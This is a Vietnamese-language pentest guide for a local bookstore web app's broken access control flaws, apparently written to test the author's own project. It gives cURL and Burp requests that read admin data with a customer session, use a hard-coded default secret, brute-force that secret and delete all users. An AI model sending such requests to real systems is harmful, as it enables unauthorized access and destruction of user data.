# HƯỚNG DẪN TEST LỖ HỔ HÀNG BROKEN ACCESS CONTROL - BOOKSTORE PROJECT

## CHUẨN BỊ TRƯỚC KHI TEST
1. Chạy project: `run-localhost-https.bat` 
2. Truy cập: https://localhost:8443
3. Chuẩn bị 2 tài khoản:
   - Tài khoản **customer** (user thông thường)
   - Tài khoản **admin** (dự dùng để so sánh)
4. Cài đặt công cụ:
   - Burp Suite Community (hoặc OWASP ZAP)
   - cURL (để test qua CLI)
   - Browser DevTools (F12)

---

## ✅ TEST 1: User thường truy cập được API admin

### Lỗ hổng:
- `filters/JwtFilter.java`: cho phép public GET tới `/api/admin/categories`, `/api/admin/dashboard`
- `web/admin/AdminDashboardServlet.java`: không check role admin
- `web/admin/AdminCategoriesServlet.java`: create/update/delete không check role

### Bước test chi tiết:

#### **Phương pháp 1: Dùng Browser + Burp Suite**

**Bước 1:** Đăng nhập với tài khoản customer
```
1. Mở https://localhost:8443
2. Login với username: customer (hoặc tài khoản user thường)
3. Password: 123456 (hoặc password của bạn)
```

**Bước 2:** Bật Burp Suite
```
1. Mở Burp Suite
2. Vào tab "Proxy" → "Settings"
3. Bật proxy trên port 8080 (mặc định)
4. Cấu hình browser proxy thành localhost:8080
5. Hoặc dùng FoxyProxy extension để toggle dễ hơn
```

**Bước 3:** Truy cập API admin trong browser
```
Nhập trực tiếp URL: https://localhost:8443/api/admin/dashboard
```

**Bước 4:** Kiểm tra Burp HTTP History
```
Burp → Proxy → HTTP history
- Tìm request tới /api/admin/dashboard
- Kiểm tra Response:
  * Nếu HTTP 200 OK → LỖ HỔ HÀNG XÁC NHẬN ✓
  * Response có chứa: stats, revenue, topSellers, v.v...
```

**Bước 5:** Tấn công - Tạo category không phải admin
```
Trong Burp Repeater:
1. Tạo tab mới → "New Tab"
2. Copy-paste request:

POST /api/admin/categories?action=create HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<your-customer-session-cookie>
Content-Length: 19

name=HackedCategory

3. Bấm "Send"
4. Kiểm tra Response:
   - HTTP 200 OK → Lỗ hổng xác nhận ✓
   - Category đã được tạo vào DB dù user không phải admin
```

---

#### **Phương pháp 2: Dùng cURL (nhanh nhất)**

**Bước 1:** Đăng nhập lấy session cookie
```bash
# Đăng nhập customer
curl -k -c cookies.txt \
  -X POST https://localhost:8443/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=customer&password=123456"
```

**Bước 2:** Lấy dashboard admin (dùng cookie customer)
```bash
# Đọc dữ liệu admin dashboard mà không cần role admin
curl -k -b cookies.txt \
  https://localhost:8443/api/admin/dashboard
```

**Kết quả mong đợi:**
```json
{
  "stats": {...},
  "revenue": "...",
  "topSellers": [...]
}
```

**Bước 3:** Tạo category mới (tấn công ghi dữ liệu)
```bash
# POST tạo category với tài khoản customer
curl -k -b cookies.txt \
  -X POST https://localhost:8443/api/admin/categories?action=create \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=HackedByCustomer"
```

**Kết quả xác nhận lỗ hổng:** HTTP 200, category được tạo ✓

---

## ✅ TEST 2: Takeover API admin bằng secret mặc định

### Lỗ hổng:
- `web/AdminSupportChatServlet.java`: fallback secret = `dev-secret-key-change-me`
- `web/AdminOrdersServlet.java`: cùng secret
- `web/AdminServlet.java` (`/api/admin/clear-users`): cho phép nếu biết secret
- `assets/js/admin/AdSupportChat.js`: lộ secret ở frontend

### Bước test chi tiết:

#### **Phương pháp 1: Dùng Browser DevTools**

**Bước 1:** Kiểm tra source code frontend
```
1. Mở https://localhost:8443 (không cần login)
2. Nhấn F12 → Tab "Sources"
3. Tìm file: assets/js/admin/AdSupportChat.js
4. Tìm chuỗi "secret" hoặc "key"
5. Thấy secret: dev-secret-key-change-me ← LỖ HỔ HÀNG NGAY!
```

**Bước 2:** Dùng secret này để đọc conversation hỗ trợ
```
Nhập trực tiếp URL:
https://localhost:8443/api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me

Kết quả: HTTP 200, danh sách conversation admin ✓
```

**Bước 3:** Đọc các đơn hàng admin
```
https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me

Kết quả: Danh sách order (dữ liệu nhạy cảm)
```

**Bước 4:** Xóa toàn bộ user (tấn công destructive)
```
https://localhost:8443/api/admin/clear-users?secret=dev-secret-key-change-me

Phương pháp: POST request
POST /api/admin/clear-users?secret=dev-secret-key-change-me HTTP/1.1
Host: localhost:8443
Content-Length: 0

Kết quả: Toàn bộ user bị xóa ← IMPACT CAO NHẤT
```

---

#### **Phương pháp 2: Dùng cURL (không cần tài khoản)**

**Cách 1: Đọc hội thoại support**
```bash
curl -k "https://localhost:8443/api/admin/support-chat?action=conversations&secret=dev-secret-key-change-me"
```

**Cách 2: Đọc tất cả đơn hàng**
```bash
curl -k "https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me"
```

**Cách 3: Xóa toàn bộ user (NGUY HIỂM)**
```bash
curl -k -X POST \
  "https://localhost:8443/api/admin/clear-users?secret=dev-secret-key-change-me"
```

---

#### **Phương pháp 3: Dùng Burp Suite Intruder (brute-force secret)**

Nếu chưa biết secret:

```
1. Burp → Intruder → "Sniper"
2. Target: POST /api/admin/support-chat?action=conversations&secret=§dev-secret-key-change-me§
3. Payloads: danh sách các secret thường dùng (dev-key, secret123, etc.)
4. Options: filter status code 200 OK
5. Start attack
```

---

## 📋 BẢNG KIỂM TRA LỖ HỔ HÀNG

| Lỗ hổng | Test | Kth? | Ghi chú |
|---------|------|------|---------|
| Customer đọc API admin dashboard | ✓ | GET /api/admin/dashboard (với cookie customer) | HTTP 200 OK |
| Customer tạo category | ✓ | POST /api/admin/categories?action=create | Category được tạo |
| Customer cập nhật category | ✓ | PUT /api/admin/categories/1?action=update | Updated thành công |
| Customer xóa category | ✓ | DELETE /api/admin/categories/1?action=delete | Xóa thành công |
| Không cần login đọc admin data | ✓ | GET /api/admin/support-chat?secret=dev-secret-key-change-me | HTTP 200 OK |
| Không cần login xóa user | ✓ | POST /api/admin/clear-users?secret=dev-secret-key-change-me | User bị xóa |
| Admin shipper xem đơn hàng khác | ✓ | GET /api/orders/2 (order của user khác) | Có access |

---

## 🛠️ MẬT COVER LỖ HỔ HÀNG

Nếu bạn muốn chứng minh lỗ hổng đầy đủ hơn, dùng kỹ thuật này:

### Lấy token/cookie từ nhiều loại user
```bash
# Customer token
curl -k -c customer.txt -X POST https://localhost:8443/api/login \
  -d "username=customer&password=123456"

# Shipper token
curl -k -c shipper.txt -X POST https://localhost:8443/api/login \
  -d "username=shipper&password=123456"

# Seller token
curl -k -c seller.txt -X POST https://localhost:8443/api/login \
  -d "username=seller&password=123456"
```

### Test horizontal privilege escalation (customer → seller)
```bash
# Customer cố gắng sửa profile shipper khác
curl -k -b customer.txt -X PUT https://localhost:8443/api/shipper/2 \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked","status":"inactive"}'
```

### Test vertical privilege escalation (customer → admin)
```bash
# Customer cố gắng truy cập endpoint admin
curl -k -b customer.txt https://localhost:8443/api/admin/dashboard
```

---

## 📝 GHI CHÉP KẾT QUẢ

Sau khi test xong, lập báo cáo với format:

```
[BROKEN ACCESS CONTROL - A01]

1. Vulnerability: Unauthorized Admin Dashboard Access
   - URL: GET /api/admin/dashboard
   - Cookie: JSESSIONID=customer_session
   - Status: HTTP 200 OK
   - Impact: Information Disclosure (Revenue, Stats, Top Sellers)
   - Severity: HIGH
   - Proof: Screenshot / curl output

2. Vulnerability: Unauthorized Category Creation
   - URL: POST /api/admin/categories?action=create
   - Method: POST
   - User Role: Customer
   - Status: HTTP 200, Category created in DB
   - Impact: Data Integrity
   - Severity: HIGH

3. Vulnerability: Admin API Accessible via Default Secret
   - URL: /api/admin/support-chat?secret=dev-secret-key-change-me
   - No authentication needed
   - Status: HTTP 200, sensitive data leaked
   - Impact: Confidentiality, Integrity
   - Severity: CRITICAL

4. Vulnerability: Destructive API via Default Secret
   - URL: POST /api/admin/clear-users?secret=dev-secret-key-change-me
   - Result: All users deleted
   - Impact: Availability + Data Loss
   - Severity: CRITICAL
```

---

## ⚠️ LƯỚI AN TOÀN KIỂM TRA

✓ Test chỉ trên localhost/lab environment
✓ Không test trên production/live server
✓ Ghi lại tất cả các action (screenshots, logs)
✓ Restore DB sau khi test destructive
✓ Thông báo lỗ hổng cho team phát triển
✓ Không chia sẻ secret/credentials với người khác

---

## 📚 TÀI LIỆU THAM KHẢO

- OWASP A01:2025 - Broken Access Control: https://owasp.org/Top10/A01_2025-Broken_Access_Control/
- Project source: /src/main/java/filters/JwtFilter.java
- Project source: /src/main/java/web/admin/AdminDashboardServlet.java
- Project source: /src/main/java/web/AdminSupportChatServlet.java

